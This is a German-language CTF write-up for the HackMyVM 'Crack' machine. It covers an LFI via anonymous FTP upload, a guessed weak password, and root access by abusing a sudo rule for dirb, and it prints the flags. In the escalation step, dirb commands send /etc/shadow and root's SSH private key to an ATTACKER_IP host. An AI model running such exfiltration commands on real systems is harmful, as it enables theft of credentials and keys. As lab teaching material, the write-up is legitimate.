# Crack - HackMyVM (Easy)

![Crack Icon](Crack.png)

## Übersicht

*   **VM:** Crack
*   **Plattform:** [HackMyVM](https://hackmyvm.eu/machines/machine.php?vm=Crack)
*   **Schwierigkeit:** Easy
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 20. Juni 2023
*   **Original-Writeup:** https://alientec1908.github.io/Crack_HackMyVM_Easy/
*   **Autor:** Ben C.

## Kurzbeschreibung

Die virtuelle Maschine "Crack" von HackMyVM (Schwierigkeitsgrad: Easy) wurde durch eine Local File Inclusion (LFI)-Schwachstelle in einem benutzerdefinierten Python-Netzwerkdienst kompromittiert. Der Dienst auf Port 12359 las Dateien, wenn eine gleichnamige Datei in einem anonym beschreibbaren FTP-Upload-Verzeichnis existierte. Nachdem `/etc/passwd` ausgelesen wurde, konnte ein Benutzer (`cris`) identifiziert werden. Dessen schwaches Passwort wurde erraten, was zu initialem Zugriff via ShellInABox (Port 4200) führte. Die Privilegienerweiterung zu Root erfolgte durch die Ausnutzung einer `sudo`-Regel, die es `cris` erlaubte, `dirb` als Root auszuführen. Dies wurde missbraucht, um den privaten SSH-Schlüssel von Root zu exfiltrieren und sich dann per SSH als Root anzumelden.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `arp-scan`
*   `vi` / `nano`
*   `nmap`
*   `grep`
*   `wget`
*   `nikto`
*   `gobuster` / `dirb`
*   `nc` (netcat)
*   `ftp`
*   `telnet`
*   `curl`
*   `chmod`, `touch`, `tr`, `awk`, `sed`
*   `hydra`
*   `find`, `getcap`, `uname`, `which`
*   `python3` (für Shell-Stabilisierung und HTTP-Server)
*   `stty`, `fg`, `reset`
*   `ss`
*   `ssh`
*   Standard Linux-Befehle (`ll`, `cd`, `cat`, `echo`, `mkdir`, `id`, `sudo`)

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Crack" erfolgte in diesen Schritten:

1.  **Reconnaissance & Service Enumeration:**
    *   Ziel-IP (`192.168.2.116`, Hostname `crack.hmv`) via `arp-scan` und `/etc/hosts` identifiziert.
    *   `nmap` zeigte offene Ports: 21 (FTP - vsftpd 3.0.3 mit erlaubtem Anonymous Login und beschreibbarem `/upload`-Verzeichnis), 4200 (HTTPS - ShellInABox) und 12359 (unbekannter Dienst, der "File to read:" sendete).
    *   Vom FTP-Server wurde die Datei `/upload/crack.py` heruntergeladen.

2.  **Vulnerability Analysis (LFI im Python-Dienst):**
    *   Analyse von `crack.py` (der Dienst auf Port 12359) enthüllte eine LFI-Schwachstelle: Das Skript las eine vom Benutzer angegebene Datei, wenn eine Datei mit demselben Basisnamen im FTP-Verzeichnis `/srv/ftp/upload/` existierte.
    *   `os.path.basename()` im Skript verhinderte einfaches Path Traversal.

3.  **Initial Access (LFI & ShellInABox):**
    *   Eine leere Datei namens `passwd` wurde lokal erstellt und per anonymem FTP in das Verzeichnis `/upload` auf dem Zielserver hochgeladen.
    *   Mittels `telnet 192.168.2.116 12359` wurde eine Verbindung zum Python-Dienst hergestellt. Nach der Aufforderung "File to read:" wurde `/etc/passwd` gesendet. Der Inhalt von `/etc/passwd` wurde erfolgreich zurückgegeben.
    *   Aus `/etc/passwd` wurden die Benutzer `root` und `cris` (mit Bash-Shell) identifiziert.
    *   Ein Brute-Force-Versuch mit `hydra` auf den FTP-Account von `cris` scheiterte.
    *   Über die Web-Oberfläche von ShellInABox (`https://192.168.2.116:4200`) gelang der Login als `cris` mit dem Passwort `cris`.
    *   Die User-Flag wurde aus `/home/cris/user.txt` gelesen.

4.  **Privilege Escalation (cris zu root via sudo dirb):**
    *   Eine stabilere Reverse Shell als `cris` wurde via `nc` und Python PTY etabliert.
    *   `sudo -l` für `cris` zeigte: `(ALL) NOPASSWD: /usr/bin/dirb`.
    *   Diese `sudo`-Regel wurde ausgenutzt, um Dateien als Root zu lesen:
        1.  Ein Python-HTTP-Server wurde auf dem Angreifer-System gestartet.
        2.  Auf dem Zielsystem wurde `sudo -u root /usr/bin/dirb http://ATTACKER_IP/ /etc/shadow` ausgeführt. `dirb` las `/etc/shadow` (als Root) und sendete jede Zeile als GET-Request an den Angreifer.
        3.  Die Passwort-Hashes wurden in den HTTP-Logs des Angreifers sichtbar.
        4.  Dieselbe Methode wurde verwendet, um `/root/.ssh/id_rsa` zu exfiltrieren: `sudo -u root /usr/bin/dirb http://ATTACKER_IP/ /root/.ssh/id_rsa`.
    *   Der private SSH-Schlüssel von Root wurde aus den HTTP-Logs rekonstruiert.
    *   Der rekonstruierte Schlüssel wurde auf dem Zielsystem (z.B. in `/home/cris/id_root`) gespeichert und die Berechtigungen (`chmod 600`) gesetzt.
    *   Mit `ssh root@localhost -i /home/cris/id_root` wurde eine Root-Shell erlangt (da der SSH-Dienst auf Port 22 auch lokal lauschte).
    *   Die Root-Flag wurde aus `/root/root_fl4g.txt` gelesen.

## Wichtige Schwachstellen und Konzepte

*   **Anonymer FTP-Zugang mit Schreibrechten:** Ermöglichte das Hochladen einer Trigger-Datei für die LFI.
*   **Local File Inclusion (LFI):** Im benutzerdefinierten Python-Dienst, ausgenutzt durch das Platzieren einer gleichnamigen Datei im FTP-Upload-Verzeichnis.
*   **Schwache Passwörter:** Erlaubten den Login als `cris` via ShellInABox (Benutzername = Passwort).
*   **Unsichere `sudo`-Konfiguration (`dirb`):** Erlaubte das Ausführen von `dirb` als Root, was zum Auslesen beliebiger Dateien missbraucht wurde (File Exfiltration über HTTP-Requests).
*   **SSH Key Exfiltration & Login:** Erlangen des privaten SSH-Schlüssels von Root und anschließender Login.

## Flags

*   **User Flag (`/home/cris/user.txt`):** `eG4TUsTBxSFjTPHMV`
*   **Root Flag (`/root/root_fl4g.txt`):** `wRt2xlFjcYqXXo4HMV`

## Tags

`HackMyVM`, `Crack`, `Easy`, `FTP`, `LFI`, `Python`, `ShellInABox`, `Weak Credentials`, `Sudo Privilege Escalation`, `dirb`, `File Exfiltration`, `SSH`, `Linux`
